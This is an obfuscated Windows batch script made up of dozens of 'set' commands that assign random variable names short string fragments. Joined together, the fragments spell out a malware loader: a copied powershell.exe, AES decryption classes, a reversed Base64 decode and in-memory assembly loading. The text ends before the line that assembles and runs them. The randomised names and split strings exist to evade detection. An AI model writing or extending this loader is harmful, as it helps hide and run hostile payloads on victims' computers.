@echo off
set "upNgVsUafK=we"
set "IYaJybRwAn=\v"
set "MFxvWizFdy=ow"
set "NeptsqyzWS=.e"
set "tLzjdShYdz=y "
set "zNAgblLnuh=he"
set "rDUSZmtnTL=Po"
set "nkIEfdFKEt=in"
set "aZMAXcYykE=:\"
set "XwsvQxdDlK=he"
set "xcRYOcMSqQ=32"
set "pBjaNxDSky=ws"
set "jUmhTgCDvu=nd"
set "AvcQRbtzRi=st"
set "xOISZBNQHZ=po"
set "imgbAWVOJo=py"
set "ZqLxsLbHQI=rS"
set "yEodpOSzEo= C"
set "XxDeIHJzMx=s\"
set "eqlqtnomYY=ll"
set "lLwllIAhVP=1."
set "uUYmYCuNnH=\W"
set "VKzWvNNdPe=ll"
set "cBkKwIeuee=0\"
set "PGfuuxDebP=do"
set "sCeiaMqhzm=em"
set "MxDQcXXrqy=xe"
set "wbnXbOOESA=we"
set "FKSFffNFGR=Sy"
set "GRUOqRiiGY=Wi"
set "MgqjVhOpnQ=rs"
set "oqOvPcGtNi= /"
set "KQHLiFebJX=co"
set "FvvCcPahHC= %~dp0"
set "hVReMUwluM=cd"
set "aWRVtUArUd=oArr"
set "sspPEfrrAe=KSEL"
set "pshslTHurJ=-1.."
set "sQnThXOUww=bstr"
set "hXpoQmaZcD=ode]"
set "JQaOswQtlr=stem"
set "vHCAOLcmXK=.Ass"
set "SSomAXoEnR=ZJt."
set "arSRELnOWE=);$r"
set "mIgeinWIyh=$Cfh"
set "AioFLalPDf=riaC"
set "YBoFWjQnrK=daeR"
set "yuyBHgYriJ=g = "
set "pdtCrpBPDX=$Cfh"
set "pnXTKkrhSq=]::C"
set "EOPgUYNvhV=e]::"
set "QPXmsRktfi=O.Me"
set "aMaAxQOtBI=tj);"
set "TULKrJOZPx=ew-O"
set "pbejZxRrOx=lBlo"
set "EvaVoWQbXI=Secu"
set "KDmaxsJMkc='gni"
set "JkmrvgJItX=.IO."
set "KwleBxKKAf=;$cb"
set "rmEcqrmiTA=tsWi"
set "QnexMJrWRk=+hAO"
set "oQmSRpSIfH=[]] "
set "ffgaFGarOT=e = "
set "pGTKONMDFg=orF'"
set "dyXFEbUFmh=l) {"
set "ucpsIcfjZl=pher"
set "CDDutTqGIV=fhSZ"
set "wAnfJovhJV=esFX"
set "zkDihNwISp=ress"
set "TQBBTicOIA=-nop"
set "XZnlRKUinU=.Dis"
set "hjBVYOrLsh=Z = "
set "vSSuGwfhfF=oL'["
set "PiirGICsSQ=-Obj"
set "GCSXOQOpqz=pDZz"
set "vBZjSpNurD=rt]:"
set "dbVdpNHCjV=ert]"
set "ghwdypSVbU=.Dis"
set "EGEmpoYWVT=esMa"
set "AepsbklJiE=Fzt "
set "wwYhtMUsHq=TI, "
set "FsLVWtKsop=onve"
set "LDIubYfdQI=$SFj"
set "RdsCLsxntE=ZJt "
set "yyrqrRTJkq=tS46"
set "IAouxGNfqr=..-1"
set "UvKyBewrrV=CfhS"
set "TosDUBkyKo=::('"
set "hmThDkdMcT=pose"
set "GKJmaRujoc=ct S"
set "xOjNHLCoSD== [S"
set "vHwTLpPkeZ=m(, "
set "sfzpnDHqZs=6esa"
set "ZXzFoZLqvp=Disp"
set "JHijCNLYiP=] -j"
set "QmdufuSmEg=Z, 0"
set "SdOattJsVy=iaCt"
set "VRzGHcmnEi=join"
set "UPolBGroQS=raph"
set "ZJyznwhLEF= = N"
set "sZTjviXNlD=();$"
set "cmRQdLTaHg=7;$r"
set "aMsQqqGUsI= = $"
set "moDMMTBOEY=;$eo"
set "UlrFvqvgXe=('%*'"
set "MdoeODSFAx=tem."
set "ziorlaeezE=:('g"
set "EAIHiNIPKl=();$"
set "eMNwlOhkiB=em.I"
set "eExGeyEaZv=fore"
set "XCACFsrmvt=pose"
set "sMMWPWqHfc=m.Re"
set "pXYNNXKbpI=V = "
set "QUxxWHqDgc=0O+g"
set "kwgxALimba=grap"
